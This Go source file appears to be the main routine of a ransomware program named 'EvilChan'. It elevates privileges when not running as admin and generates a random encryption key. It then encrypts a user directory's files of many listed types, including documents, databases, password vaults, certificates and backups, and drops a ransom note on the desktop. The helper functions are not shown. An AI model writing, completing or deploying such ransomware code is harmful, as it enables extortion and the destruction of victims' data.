package main

import (
	"crypto/rand"
	"fmt"
	"os"
)

func main() {

	// Need to check if we are an admin first. If we are not, re-run as admin, and close out this process.
	if !AmAdmin() {
		fmt.Println("Elevating Privileges...")
		ElevateMe()
	}

	ransomNote := "You have been infected by EvilChan. All your files are now encrypted. Pay the ransom or lose your files. The choice is yours."
	targets := []string{".wb2", ".psd", ".p7c", ".p7b", ".p12", ".pfx", ".pem", ".crt", ".cer", ".der", ".pl", ".py", ".lua", ".css", ".js", ".asp", ".php", ".incpas", ".asm", ".hpp", ".h", ".cpp", ".c", ".7z", ".zip", ".rar", ".drf", ".blend", ".apj", ".3ds", ".dwg", ".sda", ".ps", ".pat", ".fxg", ".fhd", ".fh", ".dxb", ".drw", ".design", ".ddrw", ".ddoc", ".dcs", ".csl", ".csh", ".cpi", ".cgm", ".cdx", ".cdrw", ".cdr6", ".cdr5", ".cdr4", ".cdr3", ".cdr", ".awg", ".ait", ".ai", ".agd1", ".ycbcra", ".x3f", ".stx", ".st8", ".st7", ".st6", ".st5", ".st4", ".srw", ".srf", ".sr2", ".sd1", ".sd0", ".rwz", ".rwl", ".rw2", ".raw", ".raf", ".ra2", ".ptx", ".pef", ".pcd", ".orf", ".nwb", ".nrw", ".nop", ".nef", ".ndd", ".mrw", ".mos", ".mfw", ".mef", ".mdc", ".kdc", ".kc2", ".iiq", ".gry", ".grey", ".gray", ".fpx", ".fff", ".exf", ".erf", ".dng", ".dcr", ".dc2", ".crw", ".craw", ".cr2", ".cmt", ".cib", ".ce2", ".ce1", ".arw", ".3pr", ".3fr", ".mpg", ".jpeg", ".jpg", ".mdb", ".sqlitedb", ".sqlite3", ".sqlite", ".sql", ".sdf", ".sav", ".sas7bdat", ".s3db", ".rdb", ".psafe3", ".nyf", ".nx2", ".nx1", ".nsh", ".nsg", ".nsf", ".nsd", ".ns4", ".ns3", ".ns2", ".myd", ".kpdx", ".kdbx", ".idx", ".ibz", ".ibd", ".fdb", ".erbsql", ".db3", ".dbf", ".db-journal", ".db", ".cls", ".bdb", ".al", ".adb", ".backupdb", ".bik", ".backup", ".bak", ".bkp", ".moneywell", ".mmw", ".ibank", ".hbk", ".ffd", ".dgc", ".ddd", ".dac", ".cfp", ".cdf", ".bpw", ".bgt", ".acr", ".ac2", ".ab4", ".djvu", ".pdf", ".sxm", ".odf", ".std", ".sxd", ".otg", ".sti", ".sxi", ".otp", ".odg", ".odp", ".stc", ".sxc", ".ots", ".ods", ".sxg", ".stw", ".sxw", ".odm", ".oth", ".ott", ".odt", ".odb", ".csv", ".rtf", ".accdr", ".accdt", ".accde", ".accdb", ".sldm", ".sldx", ".ppsm", ".ppsx", ".ppam", ".potm", ".potx", ".pptm", ".pptx", ".pps", ".pot", ".ppt", ".xlw", ".xll", ".xlam", ".xla", ".xlsb", ".xltm", ".xltx", ".xlsm", ".xlsx", ".xlm", ".xlt", ".xls", ".xml", ".dotm", ".dotx", ".docm", ".docx", ".dot", ".doc", ".txt"}
	desktop := os.Getenv("USERPROFILE") + "\\Desktop\\"

	myKey := make([]byte, 32)
	_, err := rand.Read(myKey)
	checkError(err)

	// Change the root directory. Only used this for testing.
	files := EncryptSystem("C:\\Users\\middl\\", targets, myKey)
	for _, f := range files {
		fmt.Println(f)
	}
	WriteToFile(desktop+"README.TXT", []byte(ransomNote))
}
